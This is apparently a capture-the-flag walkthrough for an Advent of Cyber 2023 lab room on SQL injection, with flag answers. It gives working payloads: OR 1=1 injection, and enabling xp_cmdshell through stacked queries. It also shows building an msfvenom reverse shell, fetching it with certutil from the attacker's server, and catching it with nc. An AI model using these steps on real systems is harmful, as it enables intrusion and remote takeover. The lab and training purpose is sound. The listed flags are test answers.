# Day 10

![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/f4d5cec6-14b2-420e-9428-3d232f71c555)

## Day 10 — Tasks Answers
### 1. Manually navigate the defaced website to find the vulnerable search for What is the first webpage you come across that contains the gift-finding feature?
![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/acff22db-c563-44d2-8458-24b6078286cd)

    /giftsearch.php

### 2. Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?

Inject a Quote on a parameter 

![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/803758db-f911-4ada-a804-9190a0dd3f63)

    ODBC Driver 17 for SQL Server

### 3. Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?

Inject the code after the value of parameter ‘OR 1=1 --
![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/ae3553f3-2227-4d6c-8dac-eaa612594948)

    THM{a4ffc901c27fb89efe3c31642ece4447}

### 4. What flag is in the note file Gr33dstr left behind on the system?

        Inject the below code first
        http://THM-MACHINE-IP/giftresults.php?age='; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE; --
        Create a payload using the below command
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe

3. Start an HTTP server to host the payload with the below command
python3 -m http.server 8000

4. Send the payload to the victim site using the below command
http://THM-MACHINE-IP/giftresults.php?age='; EXEC xp_cmdshell ‘certutil -urlcache -f http://YOUR.LISTENING.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe’;--

5. Set a listener using the below command
nc -lnvp 4444

6. Execute the payload using the command
http://THM-MACHINE-IP/giftresults.php?age='; EXEC xp_cmdshell ‘C:\Windows\Temp\reverse.exe’; —

7. Change the directory to Administrator using the command
Cd C:\Users\Administrator

8. View the Content of Note.txt using the below command
type Note.txt

Ans: THM{b06674fedd8dfc28ca75176d3d51409e}

5. What is the flag you receive on the homepage after restoring the website?

